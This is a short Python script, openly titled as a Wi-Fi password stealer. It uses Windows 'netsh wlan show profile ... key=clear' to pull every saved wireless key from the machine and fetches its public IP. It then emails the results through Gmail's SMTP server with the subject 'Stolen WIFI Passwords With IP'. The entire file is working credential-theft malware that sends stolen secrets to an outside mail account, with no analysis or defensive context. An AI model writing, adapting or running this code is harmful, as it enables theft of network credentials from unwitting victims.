import aiohttp
import asyncio
import json
import re
import smtplib
import subprocess
from email.message import EmailMessage

with open('config.json', 'r') as JSON:
    config = json.load(JSON)


def steal_password():
    async def fetch(url):
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as res:
                return await res.text()

    def send_mail(from_email, from_password, subject, message, receiver_email):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        msg = EmailMessage()

        msg.set_content(message)
        msg['To'] = receiver_email
        msg['Subject'] = subject
        msg['From'] = from_email

        server.starttls()
        server.login(from_email, from_password)
        server.send_message(msg, from_addr=from_email, to_addrs=receiver_email)
        server.quit()

    command = 'netsh wlan show profile'
    networks = subprocess.check_output(command, shell=True)
    network_names_list = re.findall(r'(Profile\s+:\s)(.+)', networks.decode('utf8'))
    network_names = []

    for network in network_names_list:
        network_names.append(network[1].split('\r')[0])

    loop = asyncio.get_event_loop()
    result = loop.run_until_complete(fetch('https://api.ipify.org/'))
    result = 'Public IP: ' + result + '\n' + '\n'
    for network in network_names:
        command = 'netsh wlan show profile ' + f'"{network}"' + ' key=clear'
        current_result = subprocess.check_output(command, shell=True)
        password = re.search(r'(Key\sContent\s+:\s)(.+)', current_result.decode('utf8'))
        new_result = network + ': ' + password.group(2)
        result += new_result + '\n'

    send_mail(config['email'], config['password'], 'Stolen WIFI Passwords With IP', result, config['email'])


if __name__ == "__main__":
    steal_password()